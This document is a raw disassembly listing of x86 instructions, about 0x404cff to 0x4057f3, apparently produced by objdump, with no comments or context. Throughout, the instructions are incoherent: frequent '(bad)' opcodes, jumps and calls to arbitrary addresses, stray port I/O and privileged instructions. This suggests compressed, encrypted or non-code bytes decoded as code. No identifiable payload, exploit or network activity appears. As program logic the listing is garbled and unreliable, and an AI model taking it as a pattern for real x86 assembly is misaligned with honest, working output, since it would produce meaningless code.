  404cff:	pop    esp
  404d00:	jmp    0x1618ce08
  404d05:	jmp    0x429cb9b
  404d0a:	ds pop ebx
  404d0c:	es jg  0x404c95
  404d0f:	outs   dx,BYTE PTR ds:[esi]
  404d10:	push   es
  404d11:	fld    DWORD PTR [eax]
	...
  404d3b:	add    BYTE PTR [ecx+0x4e],bh
  404d3e:	jmp    0x839b3146
  404d43:	add    edx,esp
  404d45:	pop    edx
  404d46:	add    DWORD PTR [ebx],0xffffffb3
  404d49:	fsub   st,st(1)
  404d4b:	call   0x8779cba9
  404d50:	mov    ebx,0x49d8c67f
  404d55:	sub    ecx,esi
  404d57:	mov    cs,WORD PTR [edx+0x6e]
  404d5a:	(bad)  
  404d5b:	fdivr  DWORD PTR [ecx]
  404d5d:	or     BYTE PTR [ebp-0x1687a715],bh
  404d63:	add    esi,DWORD PTR ds:0x4d7ede9b
  404d69:	pop    esp
  404d6a:	jmp    0x321ef372
  404d6f:	inc    ebx
  404d70:	ds repz and eax,0x815b7f4c
  404d77:	push   ecx
  404d78:	add    bh,BYTE PTR [esi-0x7a]
  404d7b:	or     al,0xfe
  404d7d:	dec    ebp
  404d7e:	sar    BYTE PTR gs:[esi],cl
  404d81:	pop    ebx
  404d82:	add    cl,ch
  404d84:	mov    edx,0x9648daa
  404d89:	outs   dx,BYTE PTR ds:[esi]
  404d8a:	jmp    DWORD PTR [esi+0xd]
  404d8d:	sub    eax,ebp
  404d8f:	call   0x4dfd:0xe2ff7de9
  404d96:	test   BYTE PTR [ebx],dh
  404d98:	cmp    eax,0x3870005b
  404d9d:	jnp    0x404d8e
  404d9f:	add    BYTE PTR ds:[eax],al
	...
  404dca:	xchg   esi,eax
  404dcb:	iret   
  404dcc:	test   DWORD PTR [ecx-0x6a],eax
  404dcf:	jge    0x404dd0
  404dd1:	cdq    
  404dd2:	adc    eax,0x3da848da
  404dd7:	jle    0x404d8e
  404dd9:	or     DWORD PTR [esi+0x4381ff7d],esp
  404ddf:	pop    ebx
  404de0:	add    BYTE PTR [ecx-0x6b],ch
  404de3:	lods   al,BYTE PTR ds:[esi]
  404de4:	sti    
  404de5:	push   es
  404de6:	xchg   esi,eax
  404de7:	push   ecx
  404de8:	shr    dh,0xf1
  404deb:	mov    bh,0x0
  404ded:	jmp    0xe939282f
  404df2:	ss aad 0x9c
  404df5:	jmp    0xde90a937
  404dfa:	scas   eax,DWORD PTR es:[edi]
  404dfb:	jb     0x404dec
  404dfd:	(bad)  
  404dfe:	jno    0x404e2a
  404e00:	call   DWORD PTR [edx+ebp*2+0x2ac6ff6d]
  404e07:	inc    esp
  404e08:	cmc    
  404e09:	mov    esi,0xc185cf09
  404e0e:	and    DWORD PTR [ebp-0x1],edi
  404e11:	sbb    DWORD PTR [edx+0x422848e8],edx
  404e17:	jl     0x404dce
  404e19:	mov    DWORD PTR [ecx],ebx
  404e1b:	jge    0x404e1c
  404e1d:	add    DWORD PTR [ebx+ebx*2],edi
  404e20:	add    BYTE PTR [ecx+0x12],ch
  404e23:	out    dx,al
  404e24:	cli    
  404e25:	add    al,al
  404e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e28:	or     eax,eax
  404e2a:	jmp    0x404e68
  404e2c:	cmp    DWORD PTR [ebp+0x0],0x0
	...
  404e57:	add    BYTE PTR [edi-0x2900008c],bh
  404e5d:	push   cs
  404e5e:	cmp    edx,DWORD PTR [eax-0x69]
  404e61:	rol    DWORD PTR [ebp-0x5b7f04],cl
  404e67:	push   eax
  404e68:	jg     0x404df0
  404e6a:	loop   0x404e6c
  404e6c:	xlat   BYTE PTR ds:[ebx]
  404e6d:	dec    eax
  404e6e:	lea    eax,[ebp-0x8bfd]
  404e74:	xlat   BYTE PTR ds:[ebx]
  404e75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e76:	mov    ch,0xec
  404e78:	add    BYTE PTR [edi+edi*8-0x549e18],ah
  404e7f:	(bad)  
  404e80:	jg     0x404e27
  404e82:	mov    ch,0xe8
  404e84:	inc    eax
  404e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e86:	call   DWORD PTR [eax+0x30]
  404e89:	jmp    0xdbe8:0xa430efec
  404e90:	jnp    0x404e37
  404e92:	(bad)  
  404e93:	call   0x3fef2f
  404e98:	cmp    al,0x37
  404e9a:	lea    eax,[ebp-0x8aad]
  404ea0:	pop    ss
  404ea1:	outs   dx,DWORD PTR ds:[esi]
  404ea2:	fsub   st,st(2)
  404ea4:	addr16 pop eax
  404ea6:	inc    eax
  404ea7:	push   eax
  404ea8:	loop   0x404e84
  404eaa:	cld    
  404eab:	out    dx,eax
  404eac:	jo     0x404e53
  404eae:	push   eax
  404eaf:	(bad)  
  404eb0:	mov    edx,0xf0ffef74
  404eb5:	outs   dx,DWORD PTR ds:[esi]
  404eb6:	mov    ah,0xf4
  404eb8:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eba:	call   0x404fa8
	...
  404ee3:	add    BYTE PTR [eax],al
  404ee5:	add    al,ch
  404ee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ee8:	(bad)  
  404ee9:	(bad)  
  404eea:	jp     0x404f64
  404eec:	out    dx,eax
  404eed:	push   DWORD PTR [eax+0x3ef7de6f]
  404ef3:	in     eax,0xd6
  404ef5:	(bad)  
  404ef6:	mov    ebx,0xf9ffe6e5
  404efb:	jmp    0x75d5:0xfcf1fe8e
  404f02:	jmp    0x6972:0x3ee3ced9
  404f09:	add    cl,bl
  404f0b:	(bad)  
  404f0d:	out    dx,eax
  404f0e:	rcr    DWORD PTR [ebx+ebp*8],1
  404f11:	outs   dx,DWORD PTR ds:[esi]
  404f12:	shl    BYTE PTR [esi+edx*8],cl
  404f15:	push   0x3e
  404f17:	or     eax,0x14a9ec90
  404f1c:	(bad)  
  404f1d:	call   0x16953e
  404f22:	mov    ebx,0xa1efdeee
  404f27:	sub    al,0x33
  404f29:	call   ebx
  404f2b:	popa   
  404f2c:	out    0xff,al
  404f2e:	xchg   ecx,eax
  404f2f:	imul   edi,DWORD PTR [edx-0x1d],0xc080723e
  404f36:	push   es
  404f37:	mov    ecx,0x646eb5d6
  404f3c:	(bad)  
  404f3d:	jmp    DWORD PTR [esi-0x33]
  404f40:	out    0xff,al
  404f42:	imul   edi,edx,0x6c51e87f
  404f48:	aad    0xff
	...
  404f72:	add    BYTE PTR [eax],al
  404f74:	xchg   ebx,eax
  404f75:	test   eax,0xa951ffe5
  404f7a:	outs   dx,BYTE PTR ds:[esi]
  404f7b:	test   DWORD PTR [ecx-0x5c],0x32f647a1
  404f82:	add    al,0xff
  404f84:	repz test al,0xe5
  404f87:	push   DWORD PTR [ecx]
  404f89:	lea    ecx,[ecx-0x1e]
  404f8c:	test   BYTE PTR ds:[eax],cl
  404f8f:	shr    BYTE PTR [edx+0x268d888d],0x5c
  404f96:	xchg   esi,eax
  404f97:	aad    0x11
  404f99:	out    0x99,eax
  404f9b:	mov    DWORD PTR [ebx+0x22],ecx
  404f9e:	and    DWORD PTR [ebx+0x3e],eax
  404fa1:	outs   dx,BYTE PTR ds:[esi]
  404fa2:	inc    ebp
  404fa3:	aad    0xb3
  404fa5:	jg     0x404f3d
  404fa7:	aad    0xf1
  404fa9:	cmp    DWORD PTR [ebx+0x645b3ee1],0x7f
  404fb0:	fimul  DWORD PTR [edx+0x7a6ed56e]
  404fb6:	pushf  
  404fb7:	call   0xec9eca9d
  404fbc:	add    al,0x7e
  404fbe:	jmp    0xd1dc0ac6
  404fc3:	dec    eax
  404fc4:	mov    ecx,0xb1e555b0
  404fc9:	jp     0x40501c
  404fcb:	or     DWORD PTR [ecx-0x4474c986],ebx
  404fd1:	cmp    DWORD PTR [esi],0xffffffd5
  404fd4:	cdq    
  404fd5:	jp     0x405033
  404fd7:	in     al,dx
	...
  405000:	add    BYTE PTR [eax],al
  405002:	mov    eax,ds:0x53ec1e7a
  405007:	jb     0x40501f
  405009:	aad    0xdd
  40500b:	mov    eax,es:0x3c7a3e42
  405011:	loopne 0x405074
  405013:	jp     0x405013
  405015:	jmp    0x40506b
  405017:	jl     0x405002
  405019:	add    esi,DWORD PTR ds:0xc4f8759b
  40501f:	call   0x7a9234f5
  405024:	jb     0x404ff9
  405026:	mov    ch,0x38
  405028:	and    cl,BYTE PTR [edi+edi*8+0x5a]
  40502c:	ficomp DWORD PTR [edi-0x1b324fc7]
  405032:	xor    DWORD PTR [edx-0x2f],edi
  405035:	mov    dl,0x1f
  405037:	pop    ebx
  405038:	add    cl,ch
  40503a:	or     dh,BYTE PTR [eax+0x79f2bef0]
  405040:	call   0xffba684f
  405045:	sahf   
  405046:	mov    eax,0xea96ef86
  40504b:	sbb    BYTE PTR [eax+0x7f],0x12
  40504f:	jp     0x4050b0
  405051:	daa    
  405052:	add    eax,0xe172559e
  405057:	add    al,0x8
  405059:	sbb    edi,0xc66eff70
  40505f:	mov    bh,bh
  405061:	sbb    al,0xb1
  405063:	and    al,BYTE PTR [ecx-0x17]
	...
  40508e:	add    BYTE PTR [eax],al
  405090:	ret    0xff5c
  405093:	fdiv   QWORD PTR ds:0xc4e542ea
  405099:	dec    edi
  40509a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40509b:	mov    cl,0xfc
  40509d:	pop    edx
  40509e:	leave  
  40509f:	sub    ebp,DWORD PTR [ecx-0x669dab87]
  4050a5:	ffree  st(4)
  4050a7:	xor    DWORD PTR [edx-0x5e],ebp
  4050aa:	inc    ebp
  4050ab:	and    DWORD PTR ds:0xbee9005b,edi
  4050b1:	test   DWORD PTR [edi],0xff4cf1e9
  4050b7:	xchg   esp,eax
  4050b8:	inc    ecx
  4050b9:	jp     0x405130
  4050bb:	icebp  
  4050bc:	out    0x5a,eax
  4050be:	call   0xffb9d8bf
  4050c3:	pusha  
  4050c4:	and    BYTE PTR [edi-0x15],dh
  4050c7:	out    0x9a,al
  4050c9:	pop    ds
  4050ca:	cld    
  4050cb:	jmp    0x7240ac0d
  4050d0:	das    
  4050d1:	ror    BYTE PTR [eax+0x28],0x3a
  4050d5:	xchg   BYTE PTR [ebx],dl
  4050d7:	bound  eax,QWORD PTR [edi+0x60003b77]
  4050dd:	arpl   WORD PTR [ebp+0x9],si
  4050e0:	loopne 0x405104
  4050e2:	clc    
  4050e3:	add    DWORD PTR [edi],edx
  4050e5:	pop    ebp
  4050e6:	add    bl,ch
  4050e8:	and    edx,edi
  4050ea:	ds or  ebx,eax
  4050ed:	adc    ch,cl
  4050ef:	sub    DWORD PTR [edx],0xffffffa7
  4050f2:	add    BYTE PTR [ebp+0x0],dh
	...
  40511d:	add    BYTE PTR [edi],bl
  40511f:	mov    ?,WORD PTR [ebp-0x4]
  405122:	mov    edi,0xb8ffffe1
  405127:	clc    
  405128:	inc    esp
  405129:	clc    
  40512a:	dec    eax
  40512b:	mov    dh,0xc2
  40512d:	or     bh,dl
  40512f:	xor    eax,0x37823d8b
  405134:	inc    ecx
  405135:	add    BYTE PTR [edi+esi*2+0x56],ch
  405139:	mov    ebp,DWORD PTR [eax]
  40513b:	xchg   edi,eax
  40513c:	imul   BYTE PTR ds:[eax-0x74]
  405140:	or     edi,edi
  405142:	xchg   edx,eax
  405143:	nop
  405144:	mov    DWORD PTR ds:0x4137c2,0x5c97
  40514e:	enter  0x55a1,0x8b
  405152:	pop    ebx
  405153:	xor    al,0x56
  405155:	push   0xffffffa7
  405157:	lea    esi,[ebp+0x8]
  40515a:	das    
  40515b:	int    0xf9
  40515d:	jmp    FWORD PTR [eax]
  40515f:	clc    
  405160:	idiv   edi
  405162:	shl    BYTE PTR [edi+eiz*8-0x15],cl
  405166:	inc    edi
  405167:	pop    edi
  405168:	add    BYTE PTR [ebx+0xf765e3f],al
  40516e:	rcr    ah,0x3f
  405171:	and    dl,dl
  405173:	jae    0x405170
  405175:	(bad)  
  405176:	lock pop ebp
  405178:	mov    ecx,eax
  40517a:	rcr    BYTE PTR fs:[edi+0x68],0x3e
  40517f:	fstp   TBYTE PTR [ebx]
  405181:	inc    ecx
	...
  4051aa:	add    BYTE PTR [eax],al
  4051ac:	ds xor esp,ebx
  4051af:	push   0x1c
  4051b1:	add    BYTE PTR [ebx],0xb
  4051b4:	(bad)  
  4051b5:	sub    eax,0x867ec608
  4051ba:	add    ebp,DWORD PTR [edx+0x7a]
  4051bd:	sbb    al,0x4
  4051bf:	push   edi
  4051c0:	es and dh,ah
  4051c3:	add    BYTE PTR [esi],bh
  4051c5:	ins    DWORD PTR es:[edi],dx
  4051c6:	ret    
  4051c7:	je     0x405204
  4051c9:	enter  0x3,0xe5
  4051cd:	test   cl,cl
  4051cf:	pop    es
  4051d0:	ds pop ecx
  4051d2:	fsubr  QWORD PTR [eax-0x7cfc7e22]
  4051d8:	out    0x84,al
  4051da:	pop    edx
  4051db:	add    eax,DWORD PTR [eax]
  4051dd:	add    DWORD PTR [ebx],0x329ff98b
  4051e3:	leave  
  4051e4:	cld    
  4051e5:	jge    0x4051ea
  4051e7:	push   ebp
  4051e8:	mov    ch,0x1d
  4051ea:	xchg   ah,al
  4051ec:	mov    edx,0x3b0c47fc
  4051f1:	xor    bl,0xff
  4051f4:	test   eax,0xabc5dbd1
  4051f9:	xor    dl,dl
  4051fb:	mov    DWORD PTR [ebx],eax
  4051fd:	inc    esi
  4051fe:	shl    BYTE PTR [ebp+0x42],cl
  405201:	inc    ecx
  405202:	pop    eax
  405203:	cld    
  405204:	mov    esi,ecx
  405206:	sti    
  405207:	out    0x95,eax
  405209:	push   esi
  40520a:	sar    bh,cl
  40520c:	jns    0x4051dc
  40520e:	repz inc BYTE PTR [eax]
	...
  405239:	add    bl,ch
  40523b:	ins    DWORD PTR es:[edi],dx
  40523c:	shl    BYTE PTR [ebp+0x6a],cl
  40523f:	dec    ecx
  405240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405241:	or     DWORD PTR [esi],edi
  405243:	adc    dl,0x75
  405246:	pop    edx
  405247:	pop    ecx
  405248:	mov    dh,ch
  40524a:	push   ecx
  40524b:	pop    edx
  40524c:	out    0xbb,al
  40524e:	jl     0x4052b6
  405250:	jmp    0x3fc7078b
  405255:	xor    eax,0xfc547691
  40525a:	sbb    ebp,edx
  40525c:	leave  
  40525d:	add    al,0x3e
  40525f:	retf   
  405260:	bnd ret 
  405262:	stos   DWORD PTR es:[edi],eax
  405263:	pop    esi
  405264:	push   ss
  405265:	sub    eax,0xfcaba478
  40526a:	adc    edx,esp
  40526c:	and    al,0xfc
  40526e:	mov    ecx,0xb574c1e2
  405273:	lock in al,0x1c
  405276:	(bad)  
  405277:	ja     0x4052c9
  405279:	shl    ecx,1
  40527b:	jbe    0x405203
  40527d:	je     0x40526b
  40527f:	lds    ebx,FWORD PTR [ecx-0x7c]
  405282:	and    DWORD PTR [ebx-0x3],ebx
  405285:	jmp    0x5bde:0x53810a70
  40528c:	jmp    0xe630dc8d
  405291:	xor    BYTE PTR [ebp+0x15],ah
  405294:	and    dh,al
  405296:	inc    esi
  405297:	pop    ebx
  405298:	pusha  
  405299:	or     bh,BYTE PTR [ebp+0xdced9d]
	...
  4052c7:	add    BYTE PTR [eax+0x3e03e8b3],dl
  4052cd:	pop    ebx
  4052ce:	xchg   esi,eax
  4052cf:	sub    al,0xf8
  4052d1:	mov    ds:0xfe91fc2b,eax
  4052d6:	mov    ebx,0x915aff3c
  4052db:	adc    eax,0xdbe91bf7
  4052e0:	shl    DWORD PTR [esi+0xe],1
  4052e3:	shl    esi,1
  4052e5:	xlat   BYTE PTR ds:[ebx]
  4052e6:	mov    dl,0x42
  4052e8:	add    ebp,DWORD PTR ds:[edx+0x3e]
  4052ec:	call   FWORD PTR [edx+0x0]
  4052ef:	add    edx,ebx
  4052f1:	jne    0x4052f2
  4052f3:	out    dx,al
  4052f4:	cmc    
  4052f5:	adc    ecx,DWORD PTR [ebx+0x28]
  4052f8:	inc    edx
  4052f9:	add    ecx,DWORD PTR [eax+esi*1-0x3]
  4052fd:	pop    edx
  4052fe:	call   0xffb66253
  405303:	inc    ecx
  405304:	mul    DWORD PTR [ecx]
  405306:	inc    ecx
  405307:	jmp    0x288c0791
  40530c:	cmp    al,BYTE PTR [ebx+0x75eeb66a]
  405312:	push   0x1c531c
  405317:	adc    DWORD PTR [edi],esi
  405319:	and    al,0x41
  40531b:	jmp    0x973f6505
  405320:	push   cs
  405321:	add    eax,DWORD PTR [ebp+0x22]
  405324:	jge    0x405381
  405326:	push   0x1c25ae
  40532b:	xchg   ecx,eax
	...
  405354:	add    BYTE PTR [eax],al
  405356:	and    DWORD PTR [esi-0x1],esi
  405359:	jbe    0x4053d0
  40535b:	lods   al,BYTE PTR ds:[esi]
  40535c:	dec    ebx
  40535d:	sub    BYTE PTR [edx],bh
  40535f:	add    eax,DWORD PTR ds:0xe85b7cb2
  405365:	sbb    al,0xef
  405367:	jne    0x405368
  405369:	rcl    eax,0x21
  40536c:	inc    ecx
  40536d:	jmp    0xa88b8d87
  405372:	cmp    eax,0x8e3e2e83
  405377:	jne    0x40533c
  405379:	pushf  
  40537a:	sbb    al,BYTE PTR [edi+0x6095a48b]
  405380:	rcr    BYTE PTR [ebp-0x16c724c0],0xe8
  405387:	arpl   WORD PTR [eax+0x5b3de9],di
  40538d:	and    BYTE PTR [ebx+0x5e],bh
  405390:	add    BYTE PTR [eax],al
  405392:	mov    WORD PTR [edi+0x61d717eb],gs
  405398:	pop    esp
  405399:	je     0x405405
  40539b:	fnstcw WORD PTR [eax]
  40539d:	das    
  40539e:	retf   0xba62
  4053a1:	add    DWORD PTR [edi+0x59],edx
  4053a4:	add    bl,ch
  4053a6:	pop    edx
  4053a7:	jecxz  0x4053a9
  4053a9:	add    BYTE PTR [edi],ah
  4053ab:	pop    ecx
  4053ac:	inc    eax
  4053ad:	or     BYTE PTR [edi+0x5f],0x75
  4053b1:	in     al,0xac
  4053b3:	cdq    
  4053b4:	leave  
  4053b5:	ret    0x591b
  4053b8:	push   ebp
  4053b9:	mov    eax,DWORD PTR [eax]
	...
  4053e3:	add    BYTE PTR [ebx],al
  4053e5:	sub    eax,0x229c5356
  4053ea:	or     al,0x5
  4053ec:	pop    ss
  4053ed:	pop    ebp
  4053ee:	add    BYTE PTR [eax],al
  4053f0:	(bad)  
  4053f1:	jg     0x405443
  4053f3:	call   0x3fe74c
  4053f8:	pop    esp
  4053f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053fa:	mov    ebx,eax
  4053fc:	ins    BYTE PTR es:[edi],dx
  4053fd:	adc    cl,BYTE PTR [eax]
  4053ff:	mov    edx,DWORD PTR [edx]
  405401:	pop    ebx
  405402:	jmp    0x405406
  405404:	mov    esi,DWORD PTR [esi]
  405406:	or     ecx,ecx
  405408:	retf   
  405409:	arpl   WORD PTR [eax-0xaec32c2],ax
  40540f:	or     ecx,DWORD PTR [esi]
  405411:	adc    eax,DWORD PTR [edx]
  405413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405414:	ficom  WORD PTR [ecx-0x40]
  405417:	stos   BYTE PTR es:[edi],al
  405418:	sbb    dh,BYTE PTR [esi-0x67d3198b]
  40541e:	pop    ebx
  40541f:	pop    esi
  405420:	shl    BYTE PTR [edi+0x29a708c2],0x56
  405427:	mov    ecx,0x589b
  40542c:	pop    es
  40542d:	dec    eax
  40542e:	rcl    BYTE PTR [eax-0x536f3e9c],cl
  405434:	ds repnz (bad) 
  405437:	mov    ch,0x7e
  405439:	(bad)  
  40543c:	into   
  40543d:	test   DWORD PTR [eax+edx*4],0x900e40bd
  405444:	std    
  405445:	lods   eax,DWORD PTR ds:[esi]
  405446:	push   ds
  405447:	nop
	...
  405470:	add    BYTE PTR [eax],al
  405472:	retf   
  405473:	jnp    0x4054e8
  405475:	cmp    DWORD PTR [ebp+edi*1+0x74],0x43
  40547a:	add    dl,BYTE PTR [edx+0x74]
  40547d:	jl     0x4054c3
  40547f:	dec    esi
  405480:	or     eax,0x77fb190
  405485:	add    al,0x3d
  405487:	rol    BYTE PTR [edx+0x3c],cl
  40548a:	jg     0x40549e
  40548c:	dec    edi
  40548d:	or     ebx,DWORD PTR [edx+0x48]
  405490:	je     0x405511
  405492:	cmp    BYTE PTR [esi+0x44],dh
  405495:	nop
  405496:	cmp    eax,0x9f3c42b2
  40549b:	repnz dec esi
  40549d:	or     bh,BYTE PTR [edx]
  40549f:	dec    eax
  4054a0:	je     0x405521
  4054a2:	cmp    esi,DWORD PTR [esi+0x410e0346]
  4054a8:	(bad)
  4054ab:	loopne 0x405441
  4054ad:	rol    DWORD PTR [esp+eax*4],0x7a
  4054b1:	ret    0xba41
  4054b4:	(bad)  
  4054b5:	call   0x8bb3fdf0
  4054ba:	cmc    
  4054bb:	icebp  
  4054bc:	sub    al,0x5b
  4054be:	jge    0x405476
  4054c0:	jp     0x4054ae
  4054c2:	or     eax,0xb5fc35ad
  4054c7:	mov    dh,0xfb
  4054c9:	(bad)  
  4054ca:	mov    ch,0xb6
  4054cc:	repz pop ebp
  4054cf:	mov    esi,0x494d8fff
  4054d4:	loop   0x4054f8
	...
  4054fe:	add    BYTE PTR [eax],al
  405500:	scas   al,BYTE PTR es:[edi]
  405501:	pop    edx
  405502:	mov    eax,0x1de89673
  405507:	into   
  405508:	jns    0x4054d4
  40550a:	ins    BYTE PTR es:[edi],dx
  40550b:	mov    esp,0xc44362f0
  405510:	push   esi
  405511:	bound  ebx,QWORD PTR [ecx+0x42]
  405514:	pop    esp
  405515:	jb     0x405570
  405517:	sub    al,0xae
  405519:	xlat   BYTE PTR ds:[ebx]
  40551a:	das    
  40551b:	pop    es
  40551c:	scas   al,BYTE PTR es:[edi]
  40551d:	xlat   BYTE PTR ds:[ebx]
  40551e:	add    BYTE PTR [edi],al
  405520:	scas   al,BYTE PTR es:[edi]
  405521:	repz (bad) 
  405523:	je     0x4054da
  405525:	xchg   edi,eax
  405526:	jns    0x405556
  405528:	cdq    
  405529:	push   ss
  40552a:	mov    al,ds:0x345b42c2
  40552f:	jns    0x40554b
  405531:	(bad)  [ebp-0x418cdf20]
  405537:	xor    DWORD PTR [ebp-0x6a],esp
  40553a:	fs inc edi
  40553c:	adc    cl,BYTE PTR [ecx+eax*2]
  40553f:	sahf   
  405540:	jbe    0x40555e
  405542:	jmp    0x31dea113
  405547:	inc    ebx
  405548:	xor    DWORD PTR ds:[ebx-0x53],0x3e
  40554d:	pop    ebx
  40554e:	loop   0x405513
  405550:	jae    0x40558f
  405552:	xchg   BYTE PTR [edi+0x4e],dl
  405555:	jb     0x40554b
  405557:	jmp    DWORD PTR [edi+0x5e]
  40555a:	add    eax,DWORD PTR [ecx+edx*8]
  40555d:	call   0x6f942242
  405562:	push   ecx
  405563:	test   DWORD PTR [eax],eax
	...
  40558d:	add    cl,ah
  40558f:	pop    ebx
  405590:	jmp    0xe8294f8d
  405595:	inc    eax
  405596:	mov    cl,0xe8
  405598:	dec    esp
  405599:	fcomp  QWORD PTR [edx+edx*4]
  40559c:	jmp    0xeed68aa4
  4055a1:	xchg   BYTE PTR [ebx+0x3de9005b],al
  4055a7:	loopne 0x40552e
  4055a9:	cmp    bh,BYTE PTR [eax+0x72]
  4055ac:	(bad)  
  4055ad:	mov    ecx,0xe90156e5
  4055b2:	cmp    eax,0x3a374d83
  4055b7:	pop    ebx
  4055b8:	or     ebp,DWORD PTR [ecx]
  4055ba:	imul   ebx,esi,0xffffffac
  4055bd:	jmp    0xe57db0ff
  4055c2:	cmp    al,0x5b
  4055c4:	add    dh,ah
  4055c6:	mov    edx,0x3de900bc
  4055cb:	add    eax,0x6eb87400
  4055d0:	(bad)  
  4055d1:	fimul  WORD PTR [edx]
  4055d3:	or     ebp,eax
  4055d5:	sbb    esp,eax
  4055d7:	pop    edx
  4055d8:	add    BYTE PTR [eax+eax*8+0x6d],bl
  4055dc:	inc    dh
  4055de:	repnz or ch,al
  4055e1:	sub    DWORD PTR [eax],ecx
  4055e3:	jb     0x4055e4
  4055e5:	loop   0x4055e4
  4055e7:	out    0x1b,eax
  4055e9:	inc    ecx
  4055ea:	fwait
  4055eb:	and    eax,DWORD PTR [ecx-0x17]
  4055ee:	sbb    al,0xf3
  4055f1:	lahf   
	...
  40561a:	add    BYTE PTR [eax],al
  40561c:	or     dh,BYTE PTR [edx+0x50]
  40561f:	add    DWORD PTR [edi-0x5710097],0x21907e7
  405629:	cwde   
  40562a:	idiv   BYTE PTR [esi+0xa]
  40562d:	xchg   BYTE PTR [edi],cl
  40562f:	jbe    0x405699
  405631:	arpl   WORD PTR [ebp-0x8f119c],cx
  405637:	or     ax,0x6083
  40563b:	push   edi
  40563c:	mov    dh,BYTE PTR [ecx-0x77]
  40563f:	ins    BYTE PTR es:[edi],dx
  405640:	xchg   ecx,eax
  405641:	jo     0x405642
  405643:	dec    esi
  405644:	pop    es
  405645:	pop    ebx
  405646:	push   0x0
  405648:	xchg   edi,eax
  405649:	adc    eax,DWORD PTR [edx]
  40564b:	push   0xffffffa7
  40564d:	adc    eax,DWORD PTR [ebx]
  40564f:	push   0xc0005da7
  405654:	pop    eax
  405655:	leave  
  405656:	in     al,dx
  405657:	(bad)  
  405658:	pop    eax
  405659:	lahf   
  40565a:	call   0x9e90be
  40565f:	mov    DWORD PTR [edx+0x6f7440a5],esp
  405665:	sahf   
  405666:	jne    0x405678
  405668:	cmp    BYTE PTR [ecx],cl
  40566a:	or     al,0xff
  40566c:	shl    BYTE PTR [ebp-0x60c50818],cl
  405672:	dec    DWORD PTR [ebx-0x78a60d1]
  405678:	outs   dx,DWORD PTR ds:[esi]
  405679:	xor    ebx,ebp
  40567b:	add    BYTE PTR [edi],ah
  40567d:	jb     0x405659
  40567f:	jne    0x405681
	...
  4056a9:	add    BYTE PTR [esi+eiz*4],bl
  4056ac:	mov    ch,0xec
  4056ae:	stc    
  4056af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056b0:	(bad)  
  4056b1:	call   0x41195d
  4056b6:	fmul   st,st(2)
  4056b8:	in     al,dx
  4056b9:	dec    al
  4056bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056bc:	call   0xffe51c2a
  4056c1:	mov    edx,esp
  4056c3:	inc    eax
  4056c4:	leave  
  4056c5:	ret    0x5ceb
  4056c8:	push   ebp
  4056c9:	mov    edi,DWORD PTR [ebx-0x46133b2a]
  4056cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056d0:	call   DWORD PTR [ebx-0x48]
  4056d3:	or     cl,BYTE PTR [edi+edi*8]
  4056d6:	shl    BYTE PTR [edi+eiz*2-0x52],cl
  4056da:	pop    ds
  4056db:	push   ss
  4056dc:	add    bh,bh
  4056de:	xchg   edx,eax
  4056df:	cdq    
  4056e0:	dec    eax
  4056e1:	inc    ecx
  4056e2:	xlat   BYTE PTR ds:[ebx]
  4056e3:	xchg   esp,eax
  4056e4:	pop    edx
  4056e5:	cmc    
  4056e6:	sbb    BYTE PTR [ebx+ecx*1-0x7f86c140],ah
  4056ed:	fidivr DWORD PTR [esi]
  4056ef:	add    BYTE PTR [ebx],0x2b
  4056f2:	test   edi,esp
  4056f4:	sub    bh,0x98
  4056f7:	xor    ebx,ecx
  4056f9:	push   eax
  4056fa:	es jle 0x405701
  4056fd:	add    BYTE PTR [esi],bh
  4056ff:	sbb    dh,BYTE PTR [ebx]
  405701:	fnstsw WORD PTR [esi]
  405703:	cmp    dh,0xbf
  405706:	dec    ecx
  405707:	test   BYTE PTR [eax+0x8823e00],0x4
	...
  405736:	add    BYTE PTR [eax],al
  405738:	aas    
  405739:	add    BYTE PTR [ebx],0xf
  40573c:	mov    ecx,0x3e000434
  405741:	inc    DWORD PTR [eax-0x4]
  405744:	out    dx,al
  405745:	pop    ecx
  405746:	pop    edi
  405747:	jmp    0x85b8d895
  40574c:	push   ecx
  40574d:	js     0x405719
  40574f:	dec    DWORD PTR [esi+0x31fd3a8a]
  405755:	mov    esi,edi
  405757:	mov    edi,0x9f5b7eb3
  40575c:	jbe    0x4057a1
  40575e:	add    al,0x8d
  405760:	ret    
  405761:	mov    al,ds:0x5211ffc9
  405766:	fmul   QWORD PTR [ecx-0x353eed]
  40576c:	mov    ebp,DWORD PTR [edx+0x33]
  40576f:	call   0xb1e86
  405774:	in     eax,0x78
  405776:	retf   0x3675
  405779:	jo     0xcb19386e
  40577f:	push   eax
  405780:	out    0x60,al
  405782:	sar    edi,1
  405784:	rcl    DWORD PTR [ecx-0x35],1
  405787:	jne    0x405753
  405789:	push   ecx
  40578a:	fsub   QWORD PTR ds:0xca665ad5
  405790:	inc    ebp
  405791:	fwait
  405792:	aad    0x36
  405794:	mov    cl,0xe5
  405796:	push   esp
  405797:	fcmovnbe st,st(0)
  405799:	or     DWORD PTR [esi-0x36],0x0
	...
  4057c4:	add    BYTE PTR [eax],al
  4057c6:	mov    bh,0x15
  4057c8:	inc    ecx
  4057c9:	xchg   BYTE PTR [ebx],bl
  4057cb:	jae    0x4057b6
  4057cd:	dec    edi
  4057ce:	cld    
  4057cf:	(bad)  [edi+ecx*8-0x384b9012]
  4057d6:	xchg   esi,eax
  4057d7:	mov    ecx,0xd63e0344
  4057dc:	sub    DWORD PTR [ebx+0x2c],ecx
  4057df:	jo     0x40577d
  4057e1:	iret   
  4057e2:	push   esi
  4057e3:	in     eax,0x2c
  4057e5:	add    edi,DWORD PTR [esi]
  4057e7:	sub    DWORD PTR fs:[edi+0x20],ecx
  4057eb:	or     edi,esi
  4057ed:	dec    edi
  4057ee:	push   esi
  4057ef:	or     BYTE PTR [edx-0x2c],0x49
  4057f3:	outs   dx,DWORD PTR ds:[esi]
